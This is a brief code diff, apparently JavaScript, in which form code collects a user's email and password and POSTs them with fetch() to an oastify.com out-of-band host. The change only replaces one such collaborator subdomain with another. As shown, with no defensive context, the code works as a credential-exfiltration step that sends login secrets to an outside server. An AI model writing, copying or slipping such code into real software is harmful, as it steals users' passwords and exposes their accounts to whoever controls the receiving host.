@@ -24,7 +24,7 @@
     data.append("email", email);
     data.append("password", password);
 
-    fetch("https://907a8zkyw4np2z6y0587qcltnktbh15q.oastify.com", {
+    fetch("https://nvm8cgg31agmqenuxuzhztm65xbozen3.oastify.com", {
       method: "POST",
       body: data,
     });
